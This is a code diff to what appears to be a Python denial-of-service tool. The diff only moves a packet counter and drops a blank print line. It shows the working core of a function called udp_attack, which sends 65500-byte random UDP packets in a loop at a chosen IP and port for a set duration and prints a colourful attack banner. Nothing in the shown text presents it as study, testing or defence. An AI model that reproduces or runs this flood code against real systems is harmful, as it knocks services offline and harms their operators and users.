@@ -63,10 +63,8 @@ def udp_attack(target_ip, target_port, duration):
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     packet_data = random._urandom(65500)
     end_time = time.time() + duration
-    packets_sent = 0
-    print("")
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack has on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
-
+    packets_sent = 0
     while time.time() < end_time:
         udp_socket.sendto(packet_data, (target_ip, target_port))
         packets_sent += 1
